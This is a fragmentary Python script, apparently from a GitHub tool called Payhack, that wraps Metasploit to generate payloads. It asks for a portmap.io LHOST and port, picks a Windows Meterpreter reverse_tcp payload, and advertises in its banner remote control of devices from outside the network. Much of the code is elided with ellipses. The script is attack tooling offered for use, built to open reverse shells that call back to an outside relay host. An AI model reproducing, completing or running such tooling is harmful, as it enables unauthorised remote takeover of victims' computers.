...
# github - https://github.com/scaninfoga/Payhack.git
...
>> Payload generator for Metasploit <<"""+CY+"""
    ...
    def main():
        print(R+"""\n*****************************************************"""+CY+"""\n
>>> Main menu"""+Y+"""
Hi' my name is Rohan Nahak Use now portmap.io out side network remotely control device life time
other queries please contact rohan@scaninfoga.in
            ...
            if c==1:
                def sel1():
                    try:
                        ...
                        if ch==1: 
                            lh=input(CY+"\nEnter Portmap.io LHOST:"+W+" ")
                            lp=int(input(CY+"Enter Forward LPORT:"+W+" "))
                            ...
                            try:
                                ...
                                if pr:
                                    ...
                                    if ch==1:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter Portmap.io LPORT:"+W+" "))
                                        ply="windows/meterpreter/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==2:
                                        table()
                ...
                print(Y+"\nExit.........! Have a nice day :) ")
                print(R+"\n------------"+CY+" Code by >> "+G+" Rohan Nahak"+R+" ----------------------"+W)
                print(R+"------------"+CY+" websit >> "+G+" https://scaninfoga.in"+R+" ------------\n"+W)
            else:
                check()
                print(R+"\nInvalid choice ! Please try again :(\n")
                main()                
...
"\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
    print(R+"\n------------"+CY+" Code by >> "+G+" Rohan Nahak"+R+" ----------------------"+W)
    print(R+"------------"+CY+"  >> "+G+" https://scaninfoga.in"+R+" ------------\n"+W)
